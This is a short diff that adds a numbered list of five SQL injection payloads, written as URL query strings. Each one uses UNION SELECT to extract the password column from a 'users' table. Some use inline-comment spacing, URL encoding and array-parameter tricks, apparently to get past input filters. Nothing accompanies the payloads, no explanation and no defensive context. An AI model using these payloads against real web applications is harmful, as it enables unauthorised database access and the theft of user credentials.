@@ -1,0 +1,5 @@
+1. ?id=-1' UNION ALL SELECT NULL,(SELECT password From users)-- a
+2. ?id=-1' UNION ALL SELECT NULL,(SELECT password From users)-- a
+3. ////?id=-1' UNION ALL SELECT NULL,(SELECT password From users)-- a
+4. ?id[]=-1%27%20UNION/**/ALL/**/SELECT/**/NULL,(SELECT/**/password/**/From/**/users)%27
+5. ?id[]=$like&id[]= %%27union select * from users --%20
